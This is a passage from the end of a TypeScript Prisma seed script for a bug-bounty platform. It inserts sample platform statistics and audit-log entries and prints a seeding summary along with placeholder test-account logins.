        platformFees: new Prisma.Decimal('412.300000000'), // SOL
        paymentsMade: 36,
      },
      {
        date: new Date('2025-09-29'),
        totalUsers: 4225,
        newUsers: 25,
        activeUsers: 1402,
        totalCompanies: 147,
        newCompanies: 2,
        activeCompanies: 95,
        totalBounties: 685,
        activeBounties: 214,
        newBounties: 5,
        totalSubmissions: 1816,
        newSubmissions: 16,
        approvedSubmissions: 9,
        rejectedSubmissions: 4,
        totalVolume: new Prisma.Decimal('12595.775000000'), // SOL
        platformFees: new Prisma.Decimal('418.600000000'), // SOL
        paymentsMade: 18,
      },
    ],
  });

  console.log('✅ Created platform stats');

  await prisma.auditLog.createMany({
    data: [
      {
        userId: ethan.id,
        action: 'USER_SUSPEND',
        entityType: 'USER',
        entityId: dana.id,
        oldValue: { status: 'ACTIVE' },
        newValue: { status: 'SUSPENDED' },
        ipAddress: '192.168.1.10',
        userAgent: 'Vulnera Admin Console/1.4',
        createdAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
      },
      {
        userId: sarah.id,
        action: 'BOUNTY_PUBLISHED',
        entityType: 'BOUNTY',
        entityId: xssBounty.id,
        newValue: { status: 'ACTIVE', rewardAmount: '15.5 SOL' },
        ipAddress: '10.10.0.21',
        userAgent: 'TechCorp Dashboard/2.0',
        createdAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
      },
      {
        userId: mike.id,
        action: 'PAYMENT_APPROVED',
        entityType: 'PAYMENT',
        entityId: createdPayments[1].id,
        oldValue: { status: 'PROCESSING' },
        newValue: { status: 'COMPLETED' },
        ipAddress: '172.16.4.2',
        userAgent: 'FinTech Ops CLI/3.2',
        createdAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
      },
      {
        userId: ethan.id,
        action: 'REPORT_ESCALATED',
        entityType: 'REPORT',
        entityId: createdReports[3].id,
        newValue: { status: 'OPEN', priority: 'HIGH' },
        ipAddress: '192.168.1.10',
        userAgent: 'Vulnera Admin Console/1.4',
        createdAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
      },
    ],
  });

  console.log('✅ Created audit logs');

  console.log('🎉 Database seeding completed successfully!');
  console.log('\n📊 Summary:');
  console.log(`   Users: ${createdUsers.length}`);
  console.log(`   Companies: ${createdCompanies.length}`);
  console.log(`   Bounties: ${createdBounties.length}`);
  console.log(`   Submissions: ${createdSubmissions.length}`);
  console.log(`   Payments: ${createdPayments.length}`);
  console.log('   Reports: 4');
  console.log('   Comments: 4');
  console.log('   Notifications: 5');
  console.log('   Platform Stats Entries: 2');
  console.log('   Audit Logs: 4');

  console.log('\n🔑 Test Login Credentials (password123 for all):');
  console.log('   alice.hunter@example.com');
  console.log('   bob.security@example.com');
  console.log('   charlie.pentest@example.com');
  console.log('   dana.mobile@example.com');
  console.log('   sarah.ceo@techcorp.com');
  console.log('   mike.security@fintech.com');
  console.log('   olivia.ops@chainguard.io');
  console.log('   ethan.root@vulnera.dev');
}

main()
  .catch((e) => {
    console.error('❌ Error seeding database:', e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });